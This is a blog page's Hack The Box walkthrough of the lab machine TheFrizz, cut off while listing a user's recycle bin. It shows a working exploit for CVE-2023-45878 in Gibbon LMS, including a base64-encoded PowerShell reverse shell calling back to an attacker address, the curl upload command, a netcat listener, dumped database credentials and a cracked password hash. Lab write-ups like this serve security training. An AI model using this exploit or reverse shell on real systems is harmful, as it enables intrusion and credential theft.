@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/08/20/hackthebox-thefrizz/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewTheFrizz is a medium-difficulty machine from Hack The Box dealing initially with CVE-2023-45878 which is an unauthenticated file upload that leads to RCE. Then with some credentials exfiltrati">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: TheFrizz">
+<meta property="og:url" content="http://fouedsaidi.com/2025/08/20/Hackthebox-TheFrizz/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewTheFrizz is a medium-difficulty machine from Hack The Box dealing initially with CVE-2023-45878 which is an unauthenticated file upload that leads to RCE. Then with some credentials exfiltrati">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TheFrizz/TheFrizz.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TheFrizz/login.png">
+<meta property="article:published_time" content="2025-08-20T19:45:24.000Z">
+<meta property="article:modified_time" content="2025-08-20T20:34:18.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/TheFrizz/TheFrizz.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: TheFrizz -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: TheFrizz</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-20 22:45:24</span>
+        <span class="mobile">2025-08-20 22:45:24</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-20 23:34:18</span>
+            <span class="mobile">2025-08-20 23:34:18</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>TheFrizz is a medium-difficulty machine from Hack The Box dealing initially with CVE-2023-45878 which is an unauthenticated file upload that leads to RCE. Then with some credentials exfiltration we’ll get to the next user where we’ll extract once again some credentials from their recycle bin to eventually exploit some misconfigured GPO links to get local admin.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TheFrizz/TheFrizz.png"
+                      alt="TheFrizz-info-card"
+                ><figcaption>TheFrizz-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)</span><br><span class="line">|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/</span><br><span class="line">|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-21 02:25:00Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2022 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2022</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2022 (88%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-08-21T02:25:59</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: 6h35m12s</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see this is an Active Directory Domain Controller due to the existence of kerberos port 88. Let’s go ahead and add an entry for <code>frizz.htb</code> and <code>frizzdc.frizz.htb</code> on our <code>/etc/hosts</code> file.</p>
+<h2 id="Web-Application-http-frizzdc-frizz-htb"><a href="#Web-Application-http-frizzdc-frizz-htb" class="headerlink" title="Web Application - http://frizzdc.frizz.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://frizzdc.frizz.htb/" >http://frizzdc.frizz.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><p>Going on to the Web app, it seems to have a couple interesting functions like staff login:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/TheFrizz/login.png"
+                      alt="Web Application"
+                ><figcaption>Web Application</figcaption></figure></p>
+<p>Looking a bit down, we can notice the use of the Gibbon v25.0.00 CMS</p>
+<p>Doing some googling, I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://herolab.usd.de/security-advisories/usd-2023-0025/" >this CVE for Gibbon v25.0.00  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is unauthenticated file upload leading to RCE.</p>
+<p>You can find the PoC below where we first craft a php reverse shell and then run our exploit:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cat</span> shell.php </span><br><span class="line">&lt;?php <span class="built_in">echo</span> system(<span class="string">&#x27;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#x27;</span>)?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -X POST http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php -d <span class="string">&quot;img=image/png;shell,<span class="subst">$(cat shell.php | base64 -w0)</span>&quot;</span> -d <span class="string">&#x27;path=shell.php&#x27;</span> -d <span class="string">&#x27;gibbonPersonID=0000000001&#x27;</span> &amp;&amp;  curl http://frizzdc.frizz.htb/Gibbon-LMS/shell.php &amp;</span><br><span class="line">shell.php[1] 16075</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we get our callback:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ rlwrap nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.85] from (UNKNOWN) [10.10.11.60] 54349</span><br><span class="line"></span><br><span class="line">PS C:\xampp\htdocs\Gibbon-LMS&gt; <span class="built_in">whoami</span></span><br><span class="line">frizz\w.webservice</span><br><span class="line">PS C:\xampp\htdocs\Gibbon-LMS&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Now as usual, the first thing to do is database credentials harvesting, and indeed we do find creds:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\Gibbon-LMS&gt; <span class="built_in">cat</span> config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">Gibbon, Flexible &amp; Open School System</span><br><span class="line">Copyright (C) 2010, Ross Parker</span><br><span class="line"></span><br><span class="line">This program is free software: you can redistribute it and/or modify</span><br><span class="line">it under the terms of the GNU General Public License as published by</span><br><span class="line">the Free Software Foundation, either version 3 of the License, or</span><br><span class="line">(at your option) any later version.</span><br><span class="line"></span><br><span class="line">This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line">but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line"></span><br><span class="line">You should have received a copy of the GNU General Public License</span><br><span class="line">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Sets the database connection information.</span><br><span class="line"> * You can supply an optional <span class="variable">$databasePort</span> <span class="keyword">if</span> your server requires one.</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$databaseServer</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$databaseUsername</span> = <span class="string">&#x27;MrGibbonsDB&#x27;</span>;</span><br><span class="line"><span class="variable">$databasePassword</span> = <span class="string">&#x27;MisterGibbs!Parrot!?1&#x27;</span>;</span><br><span class="line"><span class="variable">$databaseName</span> = <span class="string">&#x27;gibbon&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Sets a globally unique <span class="built_in">id</span>, to allow multiple installs on a single server.</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$guid</span> = <span class="string">&#x27;7y59n5xz-uym-ei9p-7mmq-83vifmtyey2&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Sets system-wide caching <span class="built_in">factor</span>, used to balance performance and freshness.</span><br><span class="line"> * Value represents number of page loads between cache refresh.</span><br><span class="line"> * Must be positive <span class="built_in">integer</span>. 1 means no caching.</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$caching</span> = 10;</span><br><span class="line">PS C:\xampp\htdocs\Gibbon-LMS&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We can now use these creds to query other creds from the mysql database:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\Gibbon-LMS&gt; C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p<span class="string">&#x27;MisterGibbs!Parrot!?1&#x27;</span> --database=gibbon -e <span class="string">&quot;select username, passwordStrong,passwordStrongSalt from gibbonPerson;&quot;</span></span><br><span class="line">username        passwordStrong  passwordStrongSalt</span><br><span class="line">f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03    /aACFhikmNopqrRTVz2489</span><br><span class="line">PS C:\xampp\htdocs\Gibbon-LMS&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>We can now attemt to crack this password using Hashcat mode 1420 and rockyou, and we do get a hit:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we can use ssh to get into the box with this user:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT frizz.htb/f.frizzle:<span class="string">&#x27;Jenni_Luvs_Magic23&#x27;</span> -dc-ip frizzdc.frizz.htb</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=f.frizzle.ccache</span><br><span class="line">ssh f.frizzle@frizz.htb -K</span><br></pre></td></tr></table></figure></div>
+
+<p>A usual, we hunt for creds. We can find some interesting stuff on the user’s recycle bin:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\f.frizzle&gt; <span class="built_in">ls</span> <span class="string">&#x27;C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103&#x27;</span></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="variable">$RECYCLE</span>.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a---          10/29/2024  7:31 AM            148 <span class="variable">$IE2XMEG</span>.7z</span><br><span class="line">-a---          10/24/2024  9:16 PM       30416987 <span 